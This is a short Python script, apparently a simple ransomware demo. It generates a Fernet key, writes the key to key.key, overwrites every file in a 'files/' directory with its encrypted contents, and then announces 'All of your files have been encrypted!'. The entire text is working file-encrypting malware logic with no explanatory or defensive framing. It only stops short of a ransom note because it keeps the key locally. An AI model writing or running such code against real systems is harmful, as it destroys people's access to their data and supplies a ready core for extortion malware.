import os
from cryptography.fernet import Fernet
from helpers.file_helper import FileHelper

base_file_directory = "files/"

fileHelper = FileHelper()

# Find the files
files = fileHelper.get_files()

# Generate key to encrypt
key = Fernet.generate_key()

fileHelper.set_file_content("key.key",key)

# Encrypt file
for file in files:
    with open(base_file_directory + file, "rb") as the_file:
        contents = the_file.read()
    
    contents = fileHelper.get_file_content(base_file_directory + file)

    encrypted_contents = Fernet(key).encrypt(contents)

    fileHelper.set_file_content(base_file_directory + file,encrypted_contents)

print("All of your files have been encrypted!")